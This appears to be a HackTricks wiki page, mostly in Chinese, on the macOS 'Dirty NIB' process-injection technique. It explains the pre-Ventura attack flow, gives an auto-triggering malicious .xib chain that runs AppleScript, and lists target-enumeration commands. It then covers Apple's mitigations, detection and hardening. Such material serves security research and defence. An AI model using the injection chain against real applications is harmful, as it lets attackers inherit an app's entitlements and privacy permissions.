# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB 指滥用签名的 macOS 应用包内的 Interface Builder 文件（.xib/.nib），在目标进程内执行攻击者控制的逻辑，从而继承其 entitlements 和 TCC 权限。该技术最初由 xpn (MDSec) 记录，后由 Sector7 进行了泛化和大幅扩展，并覆盖了 Apple 在 macOS 13 Ventura 和 macOS 14 Sonoma 中的缓解措施。有关背景和深入解析，请参见文末的参考资料。

> 要点
> • 在 macOS 13 Ventura 之前：替换一个 bundle 的 MainMenu.nib（或其他在启动时加载的 nib）通常可以可靠地实现 process injection，并常常导致 privilege escalation。
> • 自 macOS 13 (Ventura) 并在 macOS 14 (Sonoma) 中进一步改进：first‑launch 深度验证、bundle 保护、Launch Constraints 以及新的 TCC “App Management” permission 在很大程度上阻止了无关应用在启动后修改 nib。攻击在一些小众场景仍可能可行（例如，同一开发者的工具修改自己的应用，或用户授予终端 App Management/Full Disk Access）。

## What are NIB/XIB files

Nib（来源于 NeXT Interface Builder）文件是用于 AppKit 应用的序列化 UI 对象图。现代 Xcode 存储可编辑的 XML .xib 文件，这些文件在构建时会被编译成 .nib。典型应用通过 `NSApplicationMain()` 加载其主 UI，该函数从应用的 Info.plist 中读取 `NSMainNibFile` 键并在运行时实例化对象图。

使该攻击可行的关键点：
- NIB 加载会实例化任意 Objective‑C 类，而不要求它们遵循 NSSecureCoding（当不存在 `initWithCoder:` 时，Apple 的 nib loader 会回退到 `init`/`initWithFrame:`）。
- Cocoa Bindings 可被滥用在 nib 实例化时调用方法，包括不需要用户交互的链式调用。


## Dirty NIB injection process (attacker view)

经典的 pre‑Ventura 流程：
1) Create a malicious .xib
- 添加一个 `NSAppleScript` 对象（或其他“gadget”类，例如 `NSTask`）。
- 添加一个 `NSTextField`，其 title 包含 payload（例如 AppleScript 或命令参数）。
- 添加一个或多个 `NSMenuItem`，通过 bindings 接线以在目标对象上调用方法。

2) Auto‑trigger without user clicks
- 使用 bindings 设置菜单项的 target/selector，然后调用私有方法 `_corePerformAction`，使得在 nib 加载时动作自动触发。这样就不需要用户点击按钮。

Minimal example of an auto‑trigger chain inside a .xib (abridged for clarity):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
这会在 nib 加载时在目标进程中实现任意 AppleScript 执行。

高级链可以：
- 实例化任意 AppKit 类（例如 `NSTask`）并调用像 `-launch` 这样的无参方法。
- 通过上面的 binding 技巧使用对象参数调用任意 selector。
- 加载 AppleScriptObjC.framework 以桥接到 Objective‑C，甚至调用特定的 C API。
- 在仍包含 Python.framework 的旧系统上，可以桥接到 Python，然后使用 `ctypes` 调用任意 C 函数（Sector7 的研究）。

3) 替换应用的 nib
- 将 target.app 复制到可写位置，替换例如 `Contents/Resources/MainMenu.nib` 为恶意 nib，然后运行 target.app。Pre‑Ventura 下，在一次 Gatekeeper 评估之后，后续启动仅执行浅层签名检查，因此非可执行资源（例如 .nib）不会被重新验证。

Example AppleScript payload for a visible test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Apple 引入了若干系统性缓解措施，大幅降低了 Dirty NIB 在现代 macOS 上的可行性：
- 首次启动的深度验证与 bundle 保护 (macOS 13 Ventura)
- 在任何应用的首次运行时（无论是否被 quarantine），系统会对所有 bundle 资源进行深度签名校验。此后，bundle 会受到保护：只有来自相同开发者（或被应用明确允许）的应用可以修改其内容。其他应用要想写入另一个应用的 bundle，需要新的 TCC “App Management” 权限。
- Launch Constraints (macOS 13 Ventura)
- 系统/Apple 捆绑的应用无法被复制到其他位置并被启动；这封堵了对系统应用使用 “复制到 /tmp、修改、运行” 的方法。
- macOS 14 Sonoma 的改进
- Apple 强化了 App Management 并修补了已知的绕过（例如由 Sector7 报告的 CVE‑2023‑40450）。Python.framework 在更早的版本被移除（macOS 12.3），这中断了某些提权链。
- Gatekeeper/Quarantine 变更
- 关于 Gatekeeper、provenance 和 assessment 的更广泛讨论以及这些变化如何影响该技术，请参见下方引用的页面。

> Practical implication
> • 在 Ventura 及更高版本中，除非你的进程拥有 App Management 或与目标使用相同 Team ID（例如开发工具），否则通常无法修改第三方应用的 .nib。
> • 给 shell/terminal 授予 App Management 或 Full Disk Access 实际上会重新打开这一攻击面，允许任何能在该终端上下文中执行代码的实体利用它。


### Addressing Launch Constraints

Launch Constraints 从 Ventura 开始阻止从非默认位置运行许多 Apple 应用。如果你此前依赖于 pre‑Ventura 的工作流（例如将 Apple 应用复制到临时目录、修改 `MainMenu.nib` 然后启动），在 >= 13.0 上预计会失败。


## Enumerating targets and nibs (useful for research / legacy systems)

- Locate apps whose UI is nib‑driven:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- 在 bundle 中查找候选的 nib 资源:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- 深入验证 code signatures (如果你篡改了资源且没有 re‑sign，会失败):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> 注意：在现代 macOS 上，尝试在未获得适当授权的情况下写入另一个应用的 bundle，会被 bundle protection/TCC 阻止。


## 检测与 DFIR 建议

- 对 bundle 资源进行文件完整性监控
- 监控已安装应用中 `Contents/Resources/*.nib` 及其他非可执行资源的 mtime/ctime 更改。
- 统一日志与进程行为
- 监控 GUI 应用中意外的 AppleScript 执行，以及加载 AppleScriptObjC 或 Python.framework 的进程。示例：
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- 主动评估
- 定期对关键应用运行 `codesign --verify --deep`，以确保资源保持完整。
- 权限上下文
- 审计哪些用户/进程拥有 TCC “App Management” 或 Full Disk Access（尤其是终端和管理代理）。将这些权限从通用 shell 中移除，可以防止轻易重新启用 Dirty NIB‑style 的篡改。


## 防御加固（开发者和防御者）

- 优先使用编程式 UI 或限制从 nib 实例化的内容。避免在 nib 图中包含强力类（例如 `NSTask`），并避免会间接对任意对象调用 selectors 的 bindings。
- 采用带有 Library Validation 的 hardened runtime（现代应用已普遍使用）。虽然这本身无法阻止 nib injection，但它会阻断轻易的本地代码加载，迫使攻击者仅使用脚本型 payloads。
- 不要在通用工具中请求或依赖广泛的 App Management 权限。如果 MDM 需要 App Management，将该上下文与用户驱动的 shell 隔离开来。
- 定期验证应用 bundle 的完整性，并使你的更新机制能够自我修复 bundle 资源。


## HackTricks 相关阅读

了解更多影响此技术的 Gatekeeper、quarantine 与 provenance 更改：

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## 参考资料

- xpn – DirtyNIB（原始文章，包含 Pages 示例）：https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
